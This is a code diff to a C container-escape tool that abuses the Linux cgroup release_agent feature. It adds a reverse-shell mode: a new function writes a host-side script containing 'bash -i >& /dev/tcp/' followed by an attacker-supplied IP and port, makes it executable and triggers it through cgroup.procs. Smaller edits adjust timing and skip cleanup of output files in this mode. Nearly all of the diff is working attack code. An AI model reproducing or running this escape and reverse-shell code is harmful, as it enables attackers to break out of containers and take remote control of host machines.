@@ -19,6 +19,7 @@
 #include "../util/custom_struts.h"
 
 #define STACK_SIZE (1024 * 1024)
+#define WAIT_RELEASE_AGENT_RUN_TIME 1
 
 struct cgroup_procs_clone_args {
     char *cgroup_procs_path;
@@ -51,7 +52,7 @@ void clear_all() {
     int remove_cgroup_mount_path_ret = remove_dir(release_agent_attack_info.mount_path);
     int remove_exp_path_ret = remove_file(release_agent_attack_info.exp_path);
     int remove_output_path_in_container_ret = 0;
-    if (release_agent_attack_info.output_path_in_container != NULL && attack_info.attack_mode != SHELL) {
+    if (release_agent_attack_info.output_path_in_container != NULL && attack_info.attack_mode != SHELL && attack_info.attack_mode != REVERSE) {
         remove_output_path_in_container_ret = remove_file(release_agent_attack_info.output_path_in_container);
     }
     if (remove_controller_path_ret != 0 || remove_cgroup_mount_path_ret != 0 || remove_exp_path_ret != 0 ||
@@ -83,14 +84,14 @@ void release_agent_exec() {
     strcat(exp, "/tmp/");
     strcat(exp, output_path_random);
 
+    write(fd, exp, strlen(exp));
+    close(fd);
+
     strcpy(output_path_in_container, "/tmp/");
     strcat(output_path_in_container, output_path_random);
 
     release_agent_attack_info.output_path_in_container = (char *) malloc(512 * sizeof(char));
     strcpy(release_agent_attack_info.output_path_in_container, output_path_in_container);
-
-    write(fd, exp, strlen(exp));
-    close(fd);
 
     int exp_mode = S_IRUSR | S_IWUSR | S_IXUSR | S_IXGRP | S_IXOTH;
     chmod(release_agent_attack_info.exp_path, exp_mode);
@@ -105,7 +106,7 @@ void release_agent_exec() {
     if (attack_info.attack_mode != SHELL) {
         printf_wrapper(INFO, "Waiting for the command execution is completed (2s)\n");
     }
-    sleep(1);
+    sleep(WAIT_RELEASE_AGENT_RUN_TIME);
 
     struct stat s;
     stat(release_agent_attack_info.output_path_in_container, &s);
@@ -132,8 +133,35 @@ void release_agent_exec() {
     }
 }
 
-void reverse() {
+void release_agent_reverse() {
+    int fd;
+    int output_path_random_length = 5;
+    char *output_path_random = malloc(output_path_random_length + 1);
+    char cgroup_procs_path[256];
+    rand_string(output_path_random, output_path_random_length);
+    char exp[2048] = "#!/bin/bash\n";
+    fd = open(release_agent_attack_info.exp_path, (O_CREAT | O_WRONLY | O_TRUNC));
+    strcat(exp, "bash -i >& /dev/tcp/");
+    strcat(exp, attack_info.ip);
+    strcat(exp, "/");
+    strcat(exp, attack_info.port);
+    strcat(exp, " 0>&1");
 
+    write(fd, exp, strlen(exp));
+    close(fd);
+
+    int exp_mode = S_IRUSR | S_IWUSR | S_IXUSR | S_IXGRP | S_IXOTH;
+    chmod(release_agent_attack_info.exp_path, exp_mode);
+
+    strcpy(cgroup_procs_path, release_agent_attack_info.controller_path);
+    strcat(cgroup_procs_path, "/cgroup.procs");
+
+    struct cgroup_procs_clone_args args;
+    args.cgroup_procs_path = cgroup_procs_path;
+    void *arg = (void *) &args;
+    clone(clear_cgroup_procs, malloc(STACK_SIZE) + STACK_SIZE, SIGCLD, arg);
+    sleep(WAIT_RELEASE_AGENT_RUN_TIME);
+    clear_all();
 }
 
 
